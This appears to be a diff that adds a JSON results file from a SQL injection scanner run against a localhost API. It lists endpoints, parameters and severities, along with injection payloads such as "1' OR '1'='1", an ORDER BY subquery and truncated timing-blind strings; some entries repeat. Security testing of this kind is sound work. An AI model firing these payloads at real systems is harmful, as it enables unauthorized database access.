@@ -1,0 +1,56 @@
+[
+  {
+    "endpoint": "http://localhost:5002/api/products",
+    "parameter": "sort",
+    "technique": "order-by-injection",
+    "confidence": 0.8,
+    "evidence": "ORDER BY behavior differs: valid=200, invalid=500",
+    "payload": "(SELECT CASE WHEN (1=1) THEN id ELSE 0 END)",
+    "severity": "MEDIUM"
+  },
+  {
+    "endpoint": "http://localhost:5002/api/products/1",
+    "parameter": "q",
+    "technique": "timing-blind-sqli",
+    "confidence": 1.0,
+    "evidence": "Timing differential: baseline 0.003s, test 0.010s (+308% slower)",
+    "payload": "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UN",
+    "severity": "HIGH"
+  },
+  {
+    "endpoint": "http://localhost:5002/api/search",
+    "parameter": "q",
+    "technique": "boolean-blind-sqli",
+    "confidence": 0.7206303724928367,
+    "evidence": "Response differential: TRUE avg=174bytes, FALSE avg=49bytes",
+    "payload": "1' OR '1'='1",
+    "severity": "HIGH"
+  },
+  {
+    "endpoint": "http://localhost:5002/api/auth/register",
+    "parameter": "first_name",
+    "technique": "timing-blind-sqli",
+    "confidence": 0.5926913520392704,
+    "evidence": "Timing differential: baseline 0.002s, test 0.004s (+59% slower)",
+    "payload": "' AND (SELECT LENGTH(REPLACE(REPLACE(REPLACE('AAAAAAAAAA', 'A', 'AA'), 'A', 'AA'), 'A', 'AA')))>0 AN",
+    "severity": "MEDIUM"
+  },
+  {
+    "endpoint": "http://localhost:5002/api/products",
+    "parameter": "sort",
+    "technique": "order-by-injection",
+    "confidence": 0.8,
+    "evidence": "ORDER BY behavior differs: valid=200, invalid=500",
+    "payload": "(SELECT CASE WHEN (1=1) THEN id ELSE 0 END)",
+    "severity": "MEDIUM"
+  },
+  {
+    "endpoint": "http://localhost:5002/api/search",
+    "parameter": "q",
+    "technique": "boolean-blind-sqli",
+    "confidence": 0.7206303724928367,
+    "evidence": "Response differential: TRUE avg=174bytes, FALSE avg=49bytes",
+    "payload": "1' OR '1'='1",
+    "severity": "HIGH"
+  }
+]
